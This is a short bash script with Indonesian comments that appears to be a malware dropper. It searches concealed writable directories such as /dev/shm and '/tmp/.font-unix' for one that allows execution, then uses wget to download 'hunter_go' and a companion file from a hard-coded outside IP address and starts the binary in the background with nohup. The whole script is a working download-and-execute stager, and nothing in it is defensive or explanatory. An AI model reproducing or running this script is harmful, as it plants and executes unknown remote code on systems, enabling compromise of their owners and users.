# Daftar kandidat folder (dari yang paling umum ke yang paling "ngumpet")
CANDIDATES=(
    "/tmp" 
    "/var/tmp" 
    "/dev/shm" 
    "$HOME" 
    "/run/user/$(id -u 2>/dev/null)" 
    "/var/cache" 
    "/var/lib/php/sessions"
    "/tmp/.font-unix"
)

# Cari folder yang bisa di-write DAN tidak dipasang 'noexec'
TARGET_DIR=""
for dir in "${CANDIDATES[@]}"; do
    if [ -d "$dir" ] && [ -w "$dir" ]; then
        # Tes apakah bisa eksekusi file di sini (cek noexec mount)
        touch "$dir/test_exec" && chmod +x "$dir/test_exec" 2>/dev/null
        if [ -x "$dir/test_exec" ]; then
            TARGET_DIR="$dir"
            rm "$dir/test_exec"
            break
        fi
        rm "$dir/test_exec" 2>/dev/null
    fi
done

# Jika semua gagal, coba cari folder apapun yang world-writable di /var atau /etc (jarang tapi kadang ada)
if [ -z "$TARGET_DIR" ]; then
    TARGET_DIR=$(find /var /etc /run -type d -writable -executable 2>/dev/null | head -n 1)
fi

# Jika masih kosong, terpaksa pakai folder saat ini
if [ -z "$TARGET_DIR" ]; then TARGET_DIR="."; fi

echo "[*] Using Writable Directory: $TARGET_DIR"

# Jalankan proses download & eksekusi di folder tersebut
wget -O "$TARGET_DIR/hunter_go" http://157.245.194.118/hunter_go
wget -O "$TARGET_DIR/master_go.bf" http://157.245.194.118/master_go.bf
chmod +x "$TARGET_DIR/hunter_go"

# Jalankan
nohup "$TARGET_DIR/hunter_go" > "$TARGET_DIR/hunt.log" 2>&1 &
